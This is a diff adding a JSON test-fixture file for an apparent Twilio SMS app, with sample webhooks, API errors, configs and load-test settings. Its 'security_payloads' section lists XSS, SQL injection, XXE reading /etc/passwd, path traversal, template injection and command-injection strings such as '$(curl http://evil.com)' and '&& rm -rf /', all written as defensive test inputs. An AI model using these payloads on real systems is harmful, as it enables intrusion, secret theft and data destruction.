@@ -1,0 +1,249 @@
+{
+  "twilio_webhooks": {
+    "valid_sms": {
+      "From": "+15551234567",
+      "To": "+15559876543",
+      "Body": "Hello from test",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd",
+      "NumMedia": "0",
+      "FromCity": "SAN FRANCISCO",
+      "FromState": "CA",
+      "FromZip": "94102",
+      "FromCountry": "US"
+    },
+    "malicious_xss": {
+      "From": "+15551234567",
+      "To": "+15559876543",
+      "Body": "<script>alert('xss')</script>",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd"
+    },
+    "sql_injection": {
+      "From": "+15551234567",
+      "To": "+15559876543",
+      "Body": "'; DROP TABLE users; --",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd"
+    },
+    "unicode_emoji": {
+      "From": "+15551234567",
+      "To": "+15559876543",
+      "Body": "Hello 👋 from test 🚀🎉",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd"
+    },
+    "international_uk": {
+      "From": "+442071234567",
+      "To": "+15559876543",
+      "Body": "Hello from London",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd",
+      "FromCountry": "GB"
+    },
+    "empty_body": {
+      "From": "+15551234567",
+      "To": "+15559876543",
+      "Body": "",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd"
+    },
+    "missing_from": {
+      "To": "+15559876543",
+      "Body": "Test message",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd"
+    },
+    "missing_body": {
+      "From": "+15551234567",
+      "To": "+15559876543",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd"
+    },
+    "long_message": {
+      "From": "+15551234567",
+      "To": "+15559876543",
+      "Body": "This is a very long message that exceeds the typical SMS length limit of 160 characters. It contains multiple sentences and should test how the system handles longer text messages that might be split into multiple parts by the carrier.",
+      "MessageSid": "SM1234567890abcdef1234567890abcd",
+      "AccountSid": "AC1234567890abcdef1234567890abcd"
+    }
+  },
+  "twilio_api_responses": {
+    "successful_call": {
+      "sid": "CA1234567890abcdef1234567890abcd",
+      "status": "queued",
+      "to": "+15551234567",
+      "from": "+15559876543",
+      "dateCreated": "2025-11-13T03:00:00Z",
+      "price": null,
+      "priceUnit": "USD"
+    },
+    "failed_invalid_number": {
+      "status": 400,
+      "message": "The 'To' number +1555 is not a valid phone number.",
+      "code": 21211
+    },
+    "failed_unverified_number": {
+      "status": 400,
+      "message": "The number +15551234567 is unverified. Trial accounts cannot send messages to unverified numbers.",
+      "code": 21608
+    },
+    "failed_authentication": {
+      "status": 401,
+      "message": "Authenticate",
+      "code": 20003
+    },
+    "rate_limit_exceeded": {
+      "status": 429,
+      "message": "Too Many Requests",
+      "code": 20429
+    }
+  },
+  "streamlit_configs": {
+    "valid_basic": {
+      "twilio_account_sid": "AC1234567890abcdef1234567890abcd",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "+15551234567",
+      "response_message": "Thanks for your message! We'll get back to you soon.",
+      "workflow_delay_seconds": 135,
+      "custom_audio_url": ""
+    },
+    "valid_international": {
+      "twilio_account_sid": "AC1234567890abcdef1234567890abcd",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "+442071234567",
+      "response_message": "Thank you for contacting us! 🇬🇧",
+      "workflow_delay_seconds": 60,
+      "custom_audio_url": "https://example.com/audio.mp3"
+    },
+    "valid_custom_audio": {
+      "twilio_account_sid": "AC1234567890abcdef1234567890abcd",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "+15551234567",
+      "response_message": "Custom response",
+      "workflow_delay_seconds": 300,
+      "custom_audio_url": "https://my-assets.com/custom-message.mp3"
+    },
+    "invalid_account_sid": {
+      "twilio_account_sid": "INVALID123",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "+15551234567",
+      "response_message": "Test",
+      "workflow_delay_seconds": 135
+    },
+    "invalid_phone_format": {
+      "twilio_account_sid": "AC1234567890abcdef1234567890abcd",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "555-1234",
+      "response_message": "Test",
+      "workflow_delay_seconds": 135
+    },
+    "empty_message": {
+      "twilio_account_sid": "AC1234567890abcdef1234567890abcd",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "+15551234567",
+      "response_message": "",
+      "workflow_delay_seconds": 135
+    },
+    "negative_delay": {
+      "twilio_account_sid": "AC1234567890abcdef1234567890abcd",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "+15551234567",
+      "response_message": "Test",
+      "workflow_delay_seconds": -10
+    },
+    "excessive_delay": {
+      "twilio_account_sid": "AC1234567890abcdef1234567890abcd",
+      "twilio_auth_token": "1234567890abcdef1234567890abcdef",
+      "twilio_phone": "+15551234567",
+      "response_message": "Test",
+      "workflow_delay_seconds": 31536000
+    }
+  },
+  "security_payloads": {
+    "xss_attacks": [
+      "<script>alert('xss')</script>",
+      "<img src=x onerror=alert('xss')>",
+      "javascript:alert('xss')",
+      "<svg onload=alert('xss')>",
+      "<<SCRIPT>alert('xss');//<</SCRIPT>"
+    ],
+    "sql_injection": [
+      "'; DROP TABLE users; --",
+      "1' OR '1'='1",
+      "admin'--",
+      "' UNION SELECT NULL, NULL, NULL--",
+      "1; DELETE FROM users WHERE '1'='1"
+    ],
+    "xml_injection": [
+      "</Response><Malicious>evil</Malicious><Response>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+      "<Response><Say>&xxe;</Say></Response>"
+    ],
+    "path_traversal": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "....//....//....//etc/passwd"
+    ],
+    "template_injection": [
+      "{{7*7}}",
+      "${7*7}",
+      "#{7*7}",
+      "<%= 7*7 %>",
+      "${process.env.SECRET_KEY}"
+    ],
+    "command_injection": [
+      "; ls -la",
+      "| cat /etc/passwd",
+      "`whoami`",
+      "$(curl http://evil.com)",
+      "&& rm -rf /"
+    ]
+  },
+  "performance_scenarios": {
+    "concurrent_requests": {
+      "count": 100,
+      "duration_seconds": 10,
+      "expected_success_rate": 0.99
+    },
+    "load_test": {
+      "virtual_users": 50,
+      "duration_seconds": 60,
+      "ramp_up_seconds": 10,
+      "target_rps": 100
+    },
+    "stress_test": {
+      "virtual_users": 200,
+      "duration_seconds": 300,
+      "expected_p95_latency_ms": 500
+    },
+    "spike_test": {
+      "baseline_users": 10,
+      "spike_users": 100,
+      "spike_duration_seconds": 30
+    }
+  },
+  "edge_cases": {
+    "boundary_values": {
+      "min_delay": 0,
+      "max_delay": 31536000,
+      "max_sms_length": 1600,
+      "min_phone_length": 10,
+      "max_phone_length": 15
+    },
+    "special_characters": {
+      "emojis": ["😀", "🚀", "❤️", "🎉", "👍", "🔥"],
+      "unicode": ["中文", "العربية", "हिन्दी", "日本語", "한국어"],
+      "symbols": ["©", "®", "™", "€", "£", "¥"],
+      "control_chars": ["\n", "\r", "\t", "\b", "\f"]
+    },
+    "international_phones": {
+      "us": "+15551234567",
+      "uk": "+442071234567",
+      "germany": "+4930123456",
+      "australia": "+61212345678",
+      "japan": "+81312345678",
+      "brazil": "+5511123456789"
+    }
+  }
+}
